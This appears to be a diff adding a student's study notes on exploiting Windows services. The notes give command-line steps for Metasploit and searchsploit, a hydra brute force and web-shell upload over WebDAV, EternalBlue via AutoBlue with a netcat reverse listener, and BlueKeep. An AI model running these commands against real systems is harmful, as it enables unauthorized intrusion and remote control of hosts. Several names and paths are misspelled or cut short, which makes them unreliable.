@@ -1,0 +1,70 @@
+# Windows Vulns
+
+- Each Windows version have many vulns associate with.
+    - Information disclosure: Access confidential data
+    - Buffer overflows 
+    - Remote code execute
+    - Priviege escalation
+    - DOS
+
+## Frequently exploited
+- SMB (share files and folder)
+- IIS (80, 443) - Web server
+- WebDAV (80, 443) - File server for web
+- RDP (Remote desktop protocol) ~ 3389
+- WinRM (Windows remote management) ~ 5986,443
+
+## Vulns scanning
+- `search type:exploit name:<service>` search for exploit for some service
+    - Sunglass service
+        `set payload windows/meterpreter/reverse_tcp`
+
+- `searchsploit <service>` command - search in exploit db
+    - smb has exploit `external blue` on Windows 7/8/sv 2008 R2
+- Another db exploit that we can use is [db_autopwn](https://github.com/hahwul/metasploit-autopwn)
+    - Download the rb script, move it to /usr/share/metaspl../plugins/
+    - On `msfconsole` run `load db_autopwn`
+- `analyze` command on `msfconsole - Analyze the host and find vulns
+
+## WebDAV
+
+IIS, web server, provide admin GUI for management. IIS supported exe file extensions:
+- asp
+- aspx
+- config
+- php
+
+WebDAV, enable a web server to functions as a file server for collaborative
+    - WebDav implements auth in the form of username and password.
+    - First step of exploit is identify webDAV has been config to run on IIS server
+    - After get the legit credential, we can login and upload a malicious .asp payload
+    - Tools: `davtest`, `cadaver`
+
+Exploit steps:
+- `nmap -sV -p 80,443 --script=http-enum <target>` - simple check if server have webDAV 
+- Brute force auth using `hydra -L <wordlists_user> -P <wordlists_pass> <target> http-get <webDAV URI path>`
+- Other way `davtest -url <target>/webdav`
+    - `davtest -auth <username:pass> ....` output what file we can upload or execute on the webDAV
+- `cadaver <target>` -> Provide user and password -> Interact with shell
+    - Use web shell in `/usr/share/webshells/asp/webshell.asp` ~ `put <path>`
+    - Lauch the webshell by click on it
+
+## External blue:
+
+**Manual**
+- WannaCry using this exploit to spreading ransomware
+- Specific tool [Auto Blue](https://github.com/3ndG4me/AutoBlue-MS17-010)
+    - Define LHOST and port -> Gen shell code
+    - Setup netcat listener `nc -nvlp 1234`
+    - `python externalblue_exploit7.py <target> <shellcode_path>/sc_x64.bin
+    - Netcat will open remote sessions
+
+**Automation:** We can using msf `exploit/ ... ms17_010_externalblue` -> meterpreter.
+
+## BlueKeep - RDP Vulns
+
+CVE-2019-0708
+
+- `msf` exploit modules `cve_20..._bluekeep_rce`
+    - Use `show targets` for display targets systems -> `set target <number>`
+    - Sometimes Windows system will crash during the exploit
